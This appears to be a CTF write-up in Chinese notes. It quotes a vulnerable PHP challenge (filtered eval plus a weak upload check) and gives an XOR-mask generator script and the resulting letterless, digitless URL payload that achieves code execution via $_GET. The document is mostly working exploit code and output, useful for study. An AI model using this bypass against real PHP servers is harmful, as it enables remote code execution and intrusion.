![[Pasted image 20230124085428.png|500]]

```php
<?php
function get_the_flag()
{
    // webadmin will remove your upload file every 20 min!!!!
    $userdir = "upload/tmp_" . md5($_SERVER['REMOTE_ADDR']);
    if (!file_exists($userdir)) {
        mkdir($userdir);
    }
    if (!empty($_FILES["file"])) {
        $tmp_name = $_FILES["file"]["tmp_name"];
        $name = $_FILES["file"]["name"];
        $extension = substr($name, strrpos($name, ".") + 1);

        if (preg_match("/ph/i", $extension)) die("^_^"); // no .php or .phtml file
        if (mb_strpos(file_get_contents($tmp_name), '<?') !== False) die("^_^"); // no php tag
        if (!exif_imagetype($tmp_name)) die("^_^"); // must have image header

        $path = $userdir . "/" . $name;
        @move_uploaded_file($tmp_name, $path);
        print_r($path);
    }
}

$hhh = @$_GET['_'];

if (!$hhh) {
    highlight_file(__FILE__);
}

if (strlen($hhh) > 18) {
    die('One inch long, one inch strong!');
}

if (preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh))
    die('Try something else!');

$character_type = count_chars($hhh, 3);
if (strlen($character_type) > 12) die("Almost there!");

eval($hhh);
```

正则ban掉了大多数字符，尝试无字母数字RCE

```php
<?php
$payload = $argv[1];

function is_banned($ch)
{
    $pattern = '/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i';
    return preg_match($pattern, $ch);
}

for ($mask = 128; $mask < 256; $mask++) {
    $valid = true;
    $result = '';
    for ($index = 0; $index < strlen($payload); $index++) {
        $ch = chr($mask) ^ $payload[$index];
        if (is_banned($ch)) {
            $valid = false;
            break;
        }
        $result .= urlencode($ch);
    }
    if ($valid) {
        for ($i = 0; $i < strlen($payload); $i++) {
            print(urlencode(chr($mask)));
        }
        print('^');
        print($result);
        break;
    }
}
```

```shell
php test.php _GET
```

```
%80%80%80%80^%DF%C7%C5%D4
```

```
/?_=${%80%80%80%80^%DF%C7%C5%D4}{%80}();&%80=phpinfo
```

![[Pasted image 20230124103517.png|1000]]

#Web #PHP #RCE